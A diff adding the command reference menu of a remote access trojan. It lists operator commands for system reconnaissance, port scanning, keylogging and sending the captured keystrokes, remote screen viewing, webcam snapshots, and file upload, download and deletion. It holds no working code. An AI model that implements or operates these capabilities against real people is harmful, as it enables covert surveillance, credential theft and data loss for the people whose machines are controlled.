@@ -1,0 +1,70 @@
+
+======================================================
+                       Commands
+======================================================
+System:
+======================================================
+
+help                      all commands available
+writein <text>            write the text to current opened window
+browser                   enter quiery to browser
+drives                   all drivers of PC
+cpu_cores                 number of CPU cores
+systeminfo (extended)     all basic info about system (via cmd)
+tasklist                  all system tasks
+localtime                 current system time
+curpid                    PID of client's process
+setwallpaper              set wallpaper
+exit                      terminate the session of RAT
+
+======================================================
+Shell:
+======================================================
+
+pwd                       get current working directory
+cd                        change directory
+cd ..                     change directory back
+dir                       get all files of current directory
+abspath                   get absolute path of files
+
+======================================================
+Network:
+======================================================
+
+ipconfig                  local ip
+portscan                  port scanner
+profiles                  network profiles
+
+======================================================
+Keylogger:
+======================================================
+
+keyscan_start             start keylogger
+send_logs                 send captured keystrokes
+stop_keylogger            stop keylogger
+
+======================================================
+Video:
+======================================================
+
+screenshare               overseing remote PC
+breakstream               break screenshare stream
+screenshot                capture screenshot
+webcam_snap               capture webcam photo
+
+======================================================
+Files:
+======================================================
+
+delfile <file>            delete file
+editfile <file> <text>    edit file
+createfile <file>         create file
+download <file> <homedir> download file
+upload                    upload file
+cp <file1> <file2>        copy file
+mv <file> <path>          move file
+mkdir <dirname>           make directory
+rmdir <dirname>           remove directory
+readfile <file>           read from file
+
+======================================================
